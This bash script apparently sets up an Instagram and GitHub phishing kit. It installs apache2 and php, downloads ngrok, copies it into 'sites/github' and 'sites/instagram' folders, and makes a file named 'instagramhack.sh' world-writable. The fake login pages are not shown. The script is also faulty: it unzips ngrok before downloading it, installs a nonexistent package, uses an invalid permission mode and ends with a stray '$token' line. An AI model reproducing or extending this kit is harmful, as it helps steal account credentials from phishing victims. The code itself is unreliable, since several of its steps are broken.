#!/bin/bash
echo ""
clear
echo ""
echo ""
echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m !!! MUST ROOT OTHERWISE SCRIPT NOT WORKING PROPERLY !!!    \e[0m'
sleep 3
clear
echo ""
echo ""
echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m >> DOWNLOAD REQUIREMENTS >> \e[0m'
sudo apt-get install apache2 -y
apt install php -y
apt install jq -y
apt install tail -y
apt install curl -y
systemctl start apache2
apt install xterm -y
apt install gnome-terminal -y
unzip ngrok-stable-linux-amd64.zip
clear
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip
cp -R ngrok sites/github/
cp -R ngrok sites/instagram/
chmod 7777 instagramhack.sh
clear
echo ""
echo ""
echo ""
$token
clear



